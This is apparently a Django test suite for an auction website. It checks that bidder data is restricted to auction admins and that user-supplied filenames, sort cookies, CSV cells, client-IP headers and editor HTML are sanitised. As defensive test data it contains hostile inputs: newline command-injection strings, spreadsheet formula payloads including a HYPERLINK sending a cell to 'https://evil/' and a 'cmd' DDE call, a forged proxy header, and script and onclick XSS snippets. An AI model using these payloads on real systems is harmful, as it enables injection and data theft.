"""Tests that AuctionTOS and user data are protected: unauthenticated and non-admin users can't reach
them, and auction admins can reach only their own auctions'. Also that a hostile query string on a
public page is ignored rather than stored in a response header.
"""

from decimal import Decimal

from django.contrib.auth import get_user_model
from django.http import HttpResponse
from django.test import RequestFactory, TestCase, override_settings
from django.urls import reverse
from django.utils import timezone

from auctions.client_ip import client_ip
from auctions.models import Auction, AuctionTOS, Club, PickupLocation
from auctions.services import attachment_filename, csv_cell
from auctions.tests import StandardTestCase

User = get_user_model()


class AuctionTOSSecurityTestCase(TestCase):
    """Test security for AuctionTOS data access"""

    def setUp(self):
        """Set up test data"""
        # Create users
        self.auction_creator = User.objects.create_user(
            username="creator", password="testpassword", email="creator@example.com"
        )
        self.auction_admin = User.objects.create_user(
            username="admin", password="testpassword", email="admin@example.com"
        )
        self.regular_user = User.objects.create_user(
            username="regular", password="testpassword", email="regular@example.com"
        )
        self.other_user = User.objects.create_user(username="other", password="testpassword", email="other@example.com")

        # Create auctions
        future_time = timezone.now() + timezone.timedelta(days=3)
        self.auction1 = Auction.objects.create(
            created_by=self.auction_creator,
            title="Test Auction 1",
            is_online=True,
            date_end=future_time,
            date_start=timezone.now(),
        )
        self.auction2 = Auction.objects.create(
            created_by=self.other_user,
            title="Test Auction 2",
            is_online=True,
            date_end=future_time,
            date_start=timezone.now(),
        )

        # Create pickup locations
        self.location1 = PickupLocation.objects.create(
            name="Location 1",
            auction=self.auction1,
            pickup_time=future_time,
        )
        self.location2 = PickupLocation.objects.create(
            name="Location 2",
            auction=self.auction2,
            pickup_time=future_time,
        )

        # Create AuctionTOS entries
        self.admin_tos = AuctionTOS.objects.create(
            user=self.auction_admin,
            auction=self.auction1,
            pickup_location=self.location1,
            is_admin=True,
            name="Admin User",
            email="admin@example.com",
            bidder_number="001",
        )
        self.regular_tos = AuctionTOS.objects.create(
            user=self.regular_user,
            auction=self.auction1,
            pickup_location=self.location1,
            is_admin=False,
            name="Regular User",
            email="regular@example.com",
            bidder_number="002",
        )
        self.other_tos = AuctionTOS.objects.create(
            user=self.other_user,
            auction=self.auction2,
            pickup_location=self.location2,
            is_admin=False,
            name="Other User",
            email="other@example.com",
            bidder_number="003",
        )

    def test_auctiontos_autocomplete_unauthenticated(self):
        """Unauthenticated users should not access AuctionTOS autocomplete"""
        url = reverse("auctiontos-autocomplete")
        response = self.client.get(url, {"auction": self.auction1.pk, "q": "test"})
        # Should redirect to login or return empty results
        self.assertIn(response.status_code, [302, 200])
        if response.status_code == 200:
            # If it returns 200, it should be empty results
            self.assertNotContains(response, "Regular User")
            self.assertNotContains(response, "Admin User")

    def test_auctiontos_autocomplete_non_admin(self):
        """Non-admin users should not access AuctionTOS autocomplete"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("auctiontos-autocomplete")
        response = self.client.get(url, {"auction": self.auction1.pk, "q": "test"})
        # Should return empty results as user is not an admin
        self.assertEqual(response.status_code, 200)
        # Check that sensitive data is not exposed
        if hasattr(response, "json"):
            data = response.json()
            # Ensure no results are returned for non-admin
            self.assertEqual(len(data.get("results", [])), 0)

    def test_auctiontos_autocomplete_admin_access(self):
        """Auction admins should access AuctionTOS autocomplete for their auction"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("auctiontos-autocomplete")
        response = self.client.get(url, {"auction": self.auction1.pk, "q": "Regular"})
        # Admin should get results
        self.assertEqual(response.status_code, 200)

    def test_auctiontos_autocomplete_creator_access(self):
        """Auction creators should access AuctionTOS autocomplete for their auction"""
        self.client.login(username="creator", password="testpassword")
        url = reverse("auctiontos-autocomplete")
        response = self.client.get(url, {"auction": self.auction1.pk, "q": "Regular"})
        # Creator should get results
        self.assertEqual(response.status_code, 200)

    def test_auctiontos_admin_view_unauthenticated(self):
        """Unauthenticated users should not access AuctionTOS admin view"""
        url = reverse("auctiontosadmin", kwargs={"pk": self.regular_tos.pk})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_auctiontos_admin_view_non_admin(self):
        """Non-admin users should not access AuctionTOS admin view"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("auctiontosadmin", kwargs={"pk": self.regular_tos.pk})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auctiontos_admin_view_admin_access(self):
        """Auction admins should access AuctionTOS admin view"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("auctiontosadmin", kwargs={"pk": self.regular_tos.pk})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)

    def test_auctiontos_delete_unauthenticated(self):
        """Unauthenticated users should not access AuctionTOS delete"""
        url = reverse("auctiontosdelete", kwargs={"pk": self.regular_tos.pk})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_auctiontos_delete_non_admin(self):
        """Non-admin users should not access AuctionTOS delete"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("auctiontosdelete", kwargs={"pk": self.regular_tos.pk})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auctiontos_memo_unauthenticated(self):
        """Unauthenticated users should not access memo endpoint"""
        url = reverse("auctiontosmemo", kwargs={"pk": self.regular_tos.pk})
        response = self.client.post(url, {"memo": "test memo"})
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_auctiontos_memo_non_admin(self):
        """Non-admin users should not access memo endpoint"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("auctiontosmemo", kwargs={"pk": self.regular_tos.pk})
        response = self.client.post(url, {"memo": "test memo"})
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auction_users_list_unauthenticated(self):
        """Unauthenticated users should not access auction users list"""
        url = reverse("auction_tos_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_auction_users_list_non_admin(self):
        """Non-admin users should not access auction users list"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("auction_tos_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auction_users_list_admin_access(self):
        """Auction admins should access auction users list"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("auction_tos_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)
        # Should see user data
        self.assertContains(response, "Regular User")

    def test_auction_users_list_creator_access(self):
        """Auction creators should access auction users list"""
        self.client.login(username="creator", password="testpassword")
        url = reverse("auction_tos_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)

    def test_auction_report_csv_unauthenticated(self):
        """Unauthenticated users should not access auction report CSV"""
        url = reverse("user_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_auction_report_csv_non_admin(self):
        """Non-admin users should not access auction report CSV"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("user_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auction_report_csv_admin_access(self):
        """Auction admins should access auction report CSV"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("user_list", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)
        # Should be CSV
        self.assertEqual(response["Content-Type"], "text/csv")

    def test_compose_email_users_unauthenticated(self):
        """Unauthenticated users should not access compose email page"""
        url = reverse("compose_email_to_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_compose_email_users_non_admin(self):
        """Non-admin users should not access compose email page"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("compose_email_to_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_compose_email_users_admin_access(self):
        """Auction admins should access compose email page"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("compose_email_to_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)

    def test_bulk_add_users_unauthenticated(self):
        """Unauthenticated users should not access bulk add users"""
        url = reverse("bulk_add_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should redirect to login or be denied
        self.assertIn(response.status_code, [302, 403])

    def test_bulk_add_users_non_admin(self):
        """Non-admin users should not access bulk add users"""
        self.client.login(username="regular", password="testpassword")
        url = reverse("bulk_add_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_bulk_add_users_admin_access(self):
        """Auction admins should access bulk add users"""
        self.client.login(username="admin", password="testpassword")
        url = reverse("bulk_add_users", kwargs={"slug": self.auction1.slug})
        response = self.client.get(url)
        # Should be allowed
        self.assertEqual(response.status_code, 200)

    def test_admin_cannot_access_other_auction_data(self):
        """Auction admins should not access data from other auctions"""
        self.client.login(username="admin", password="testpassword")
        # Try to access auction2 data (admin is not admin of auction2)
        url = reverse("auction_tos_list", kwargs={"slug": self.auction2.slug})
        response = self.client.get(url)
        # Should be denied
        self.assertEqual(response.status_code, 403)

    def test_auctiontos_validation_requires_admin(self):
        """AuctionTOS validation endpoint requires admin access"""
        # Non-admin
        self.client.login(username="regular", password="testpassword")
        url = reverse("auctiontos_validation", kwargs={"slug": self.auction1.slug})
        response = self.client.post(url, {"name": "Test"})
        # Should be denied
        self.assertEqual(response.status_code, 403)

        # Admin should work
        self.client.login(username="admin", password="testpassword")
        response = self.client.post(url, {"name": "Test"})
        # Should be allowed
        self.assertEqual(response.status_code, 200)


class LotOrderCookieTestCase(StandardTestCase):
    """?order= is echoed into the lot_order cookie, so it has to be a real sort choice."""

    def setUp(self):
        super().setUp()
        self.url = reverse("allLots")

    def stored_order(self, response):
        cookie = response.cookies.get("lot_order")
        return cookie.value if cookie else None

    def test_control_characters_in_order_do_not_break_the_page(self):
        """set_cookie() raises CookieError on a newline, which used to 500 the whole page."""
        response = self.client.get(self.url, {"order": "\nexpr 811401678 + 962228785\n"})
        self.assertEqual(response.status_code, 200)
        self.assertFalse(self.stored_order(response))

    def test_an_unknown_order_is_not_remembered(self):
        response = self.client.get(self.url, {"order": "bogus"})
        self.assertEqual(response.status_code, 200)
        self.assertFalse(self.stored_order(response))

    def test_a_real_order_is_remembered(self):
        response = self.client.get(self.url, {"order": "unloved"})
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.stored_order(response), "unloved")

    def test_a_remembered_order_is_used_on_the_next_page(self):
        self.client.cookies["lot_order"] = "unloved"
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["filter"].data["order"], "unloved")

    def test_a_junk_cookie_is_cleared_rather_than_used(self):
        self.client.cookies["lot_order"] = "bogus"
        response = self.client.get(self.url)
        self.assertEqual(response.status_code, 200)
        self.assertEqual(self.stored_order(response), "")
        self.assertNotIn("order", response.context["filter"].data)


class AttachmentFilenameTestCase(TestCase):
    """Downloads name themselves after user-supplied text, which then has to survive a header."""

    def test_control_characters_are_stripped(self):
        cleaned = attachment_filename("report-\nexpr 811401678 + 962228785\n")
        self.assertNotIn("\n", cleaned)
        # The point of the helper: this assignment is what used to raise BadHeaderError.
        HttpResponse()["Content-Disposition"] = f'attachment; filename="{cleaned}.csv"'

    def test_quotes_and_semicolons_cannot_end_the_filename(self):
        cleaned = attachment_filename('a";x=1;y="b')
        self.assertNotIn('"', cleaned)
        self.assertNotIn(";", cleaned)

    def test_a_slug_is_left_alone(self):
        self.assertEqual(attachment_filename("njas-spring-2023-auction"), "njas-spring-2023-auction")

    def test_a_name_with_nothing_usable_falls_back(self):
        self.assertEqual(attachment_filename(""), "download")
        self.assertEqual(attachment_filename(None), "download")
        self.assertEqual(attachment_filename("///"), "download")

    def test_a_long_name_is_capped(self):
        self.assertEqual(len(attachment_filename("x" * 500)), 80)


class ExportFilenameTestCase(StandardTestCase):
    """The CSV exports build their filename out of ?query=, which lands in a response header."""

    PAYLOAD = "\nexpr 811401678 + 962228785\n"

    def setUp(self):
        super().setUp()
        self.client.login(username=self.user, password="testpassword")

    def assert_survives(self, url_name):
        url = reverse(url_name, kwargs={"slug": self.online_auction.slug})
        response = self.client.get(url, {"query": self.PAYLOAD})
        self.assertEqual(response.status_code, 200)
        self.assertNotIn("\n", response["Content-Disposition"])

    def test_auction_report_survives_a_hostile_query(self):
        self.assert_survives("user_list")

    def test_lot_list_survives_a_hostile_query(self):
        self.assert_survives("lot_list")


class CsvCellTestCase(TestCase):
    """Every CSV export runs through ``csv_cell``, so what it quotes and what it leaves alone matters."""

    def test_a_formula_is_quoted(self):
        self.assertEqual(csv_cell('=HYPERLINK("https://evil/"&A1,"Open")'), '\'=HYPERLINK("https://evil/"&A1,"Open")')
        self.assertEqual(csv_cell("@SUM(A1:A9)"), "'@SUM(A1:A9)")
        self.assertEqual(csv_cell("\t=1+1"), "'\t=1+1")
        # The dash that starts text, not a number: still a formula as far as Excel is concerned.
        self.assertEqual(csv_cell("-1+1+cmd|' /c calc'!A0"), "'-1+1+cmd|' /c calc'!A0")

    def test_a_negative_number_is_left_alone(self):
        """A treasurer opens these to add them up; a quoted number is text and adds up to nothing."""
        for value in (Decimal("-10.50"), -5, "-0.01", "+3", "-1e3"):
            self.assertEqual(csv_cell(value), str(value))

    def test_only_a_whole_number_counts_as_one(self):
        for text in ("-", "+.", "-1.2.3", "-1e", "-1e+", "-e5", "--1", "-1_000", "-inf", "-١"):
            self.assertEqual(csv_cell(text), "'" + text, text)
        for text in ("-1.", "-.5", "+1E-3"):
            self.assertEqual(csv_cell(text), text)

    def test_a_long_run_of_digits_is_quick(self):
        self.assertEqual(csv_cell("-" + "0" * 100_000 + "x"), "'-" + "0" * 100_000 + "x")

    def test_nothing_else_changes(self):
        self.assertEqual(csv_cell("Neon tetra"), "Neon tetra")
        self.assertEqual(csv_cell(None), "")


class ContentSecurityPolicyTestCase(TestCase):
    """The club-website embeds exist to be iframed elsewhere, and CSP beats X-Frame-Options."""

    def test_an_ordinary_page_is_not_framable(self):
        response = self.client.get(reverse("home"), follow=True)
        self.assertIn("frame-ancestors 'self'", response["Content-Security-Policy"])

    def test_an_embed_keeps_the_rest_of_the_policy_without_frame_ancestors(self):
        club = Club.objects.create(name="CSP Test Club")
        response = self.client.get(reverse("club_events_embed", kwargs={"slug": club.slug}))
        self.assertEqual(response.status_code, 200)
        # The decorator is what marks it, and the middleware has to honour it.
        self.assertTrue(response.xframe_options_exempt)
        policy = response["Content-Security-Policy"]
        self.assertNotIn("frame-ancestors", policy)
        self.assertIn("object-src 'none'", policy)

    def test_no_form_action(self):
        """A form that POSTs and is redirected off-site -- PayPal and Square checkout, the OAuth
        consent screen -- is blocked mid-redirect by Chrome under any form-action this site could set.
        """
        response = self.client.get(reverse("home"), follow=True)
        self.assertNotIn("form-action", response["Content-Security-Policy"])


class ClientIpTestCase(TestCase):
    """Everything counted per address has to agree on which header says who the caller is."""

    HEADERS = {
        "REMOTE_ADDR": "172.18.0.5",  # the nginx container, identical for every visitor
        "HTTP_X_FORWARDED_FOR": "1.2.3.4, 172.18.0.1",  # the left-most entry is the caller's to write
        "HTTP_CF_CONNECTING_IP": "5.5.5.5",  # nothing strips this when we are not behind Cloudflare
        "HTTP_X_REAL_IP": "203.0.113.9",  # nginx, from $remote_addr
    }

    def test_the_helper_reads_x_real_ip(self):
        """And nothing else: both of the others are headers the caller writes.

        nginx overwrites X-Real-IP from $remote_addr but passes CF-Connecting-IP straight through,
        so off Cloudflare it is worth no more than X-Forwarded-For.
        """
        request = RequestFactory().get("/", **self.HEADERS)
        self.assertEqual(client_ip(request), "203.0.113.9")

    @override_settings(BEHIND_CLOUDFLARE=True)
    def test_cloudflare_wins_when_the_request_really_came_from_cloudflare(self):
        """X-Real-IP is an edge machine, so the header CF wrote is the one that names the visitor."""
        headers = {
            **self.HEADERS,
            "HTTP_X_REAL_IP": "172.64.0.1",  # 172.64.0.0/13, one of Cloudflare's published ranges
            "HTTP_CF_CONNECTING_IP": "198.51.100.7",
        }
        request = RequestFactory().get("/", **headers)
        self.assertEqual(client_ip(request), "198.51.100.7")

    @override_settings(BEHIND_CLOUDFLARE=True)
    def test_a_forged_cloudflare_header_straight_to_the_origin_counts_for_nothing(self):
        """Anyone who finds the origin address can send CF-Connecting-IP; nginx passes it through.

        Believing it would hand that caller ban evasion, shill-bid detection, geolocation and every
        rate limit. The connection didn't come from a Cloudflare machine, so it isn't believed.
        """
        headers = {**self.HEADERS, "HTTP_CF_CONNECTING_IP": "198.51.100.7"}
        request = RequestFactory().get("/", **headers)
        self.assertEqual(client_ip(request), "203.0.113.9")

    def test_allauth_agrees(self):
        """allauth's rate limits use their own helper, which on its own answers REMOTE_ADDR.

        Behind nginx that is the proxy, so ``login_failed: 10/m/ip`` and the rest were one bucket
        for the whole site. auctions.account_adapter is what puts them on the same address.
        """
        from allauth.account.adapter import get_adapter

        request = RequestFactory().get("/", **self.HEADERS)
        self.assertEqual(get_adapter().get_client_ip(request), client_ip(request))

    def test_allauth_still_answers_with_no_proxy_header(self):
        """A request that never went through nginx: the adapter raises PermissionDenied on None, so
        replacing allauth's fallback rather than preceding it would 403 every account page.
        """
        from allauth.account.adapter import get_adapter

        request = RequestFactory().get("/", REMOTE_ADDR="198.51.100.4")
        self.assertEqual(get_adapter().get_client_ip(request), "198.51.100.4")


class TableCellMarkupTests(StandardTestCase):
    """A table cell that builds markup has to say it is markup, or the table prints it as text.

    ``SafeString + str`` is a plain ``str``: one unmarked piece anywhere in a cell throws the whole
    cell's safety away, and ``django_tables2`` then escapes it, so the page shows its own HTML.
    That is how the auctions list came to show ``&lt;a href=...`` to everyone -- the markup was all
    built with ``format_html``, and one property returning ``""`` at the end undid it.
    """

    def test_the_auctions_list_prints_links_not_their_source(self):
        self.client.force_login(self.user)
        response = self.client.get(reverse("auctions"))
        self.assertNotContains(response, "&lt;a href")
        self.assertContains(response, self.online_auction.get_absolute_url())

    def test_every_auction_row_is_marked_safe(self):
        """Directly, because the page only shows auctions a visitor can see."""
        from django.utils.safestring import SafeData

        from auctions.tables import AuctionHTMxTable

        auction = self.online_auction
        auction.is_last_used = False
        auction.joined = False
        auction.distance = None
        # No promo text is the ordinary case, and the one that used to lose the cell's safety.
        auction.extra_promo_text = ""
        cell = AuctionHTMxTable([]).render_auction(auction.title, auction)
        self.assertIsInstance(cell, SafeData)


class SummernoteSanitizerTests(TestCase):
    """The editor's own output has to survive the sanitizer, or saving a page rewrites it.

    The attribute allowlist that closed off ``on*`` handlers also took ``target`` with it, and
    Summernote ships ``linkTargetBlank`` on -- so every link anybody had inserted lost its new tab
    the next time an organizer saved the auction. Nothing here had a test, which is why.
    """

    def sanitize(self, html):
        from auctions.html_sanitize import sanitize_summernote_html

        return sanitize_summernote_html(html)

    def test_a_link_keeps_the_new_tab_summernote_gave_it(self):
        result = self.sanitize('<p><a href="https://example.com/" target="_blank">rules</a></p>')
        self.assertIn('target="_blank"', result)
        self.assertIn("https://example.com/", result)

    def test_a_link_that_opens_a_tab_cannot_reach_back(self):
        """Old browsers need rel spelled out; the sanitizer writes it whatever arrived."""
        result = self.sanitize('<a href="https://example.com/" target="_blank" rel="opener">x</a>')
        self.assertIn("noopener", result)
        self.assertNotIn('rel="opener"', result)

    def test_a_target_naming_a_frame_goes(self):
        self.assertNotIn("target", self.sanitize('<a href="https://example.com/" target="sidebar">x</a>'))

    def test_a_handler_still_goes(self):
        self.assertNotIn("onclick", self.sanitize('<a href="https://example.com/" onclick="steal()">x</a>'))

    def test_a_script_url_still_goes_even_with_a_target(self):
        result = self.sanitize('<a href="javascript:alert(1)" target="_blank">x</a>')
        self.assertNotIn("javascript:", result)

    def test_a_script_tag_still_goes_with_its_contents(self):
        self.assertNotIn("alert", self.sanitize("<p>hi</p><script>alert(1)</script>"))

    def test_ordinary_formatting_survives(self):
        html = '<p><b>bold</b> <i>italic</i></p><ul><li>one</li></ul><span style="font-size: 14px;">big</span>'
        result = self.sanitize(html)
        for fragment in ("<b>", "<i>", "<li>", "font-size"):
            self.assertIn(fragment, result)
